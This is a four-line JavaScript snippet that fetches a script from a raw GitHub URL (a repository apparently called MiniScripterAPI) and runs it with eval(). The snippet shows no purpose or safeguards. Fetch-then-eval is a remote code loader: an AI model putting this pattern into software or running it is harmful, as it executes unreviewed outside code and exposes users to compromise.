url ='https://raw.githubusercontent.com/mini-programmer/MiniScripterAPI/main/mainCode.js'
const response = await fetch(url);
const data = await response.text();
eval(data)
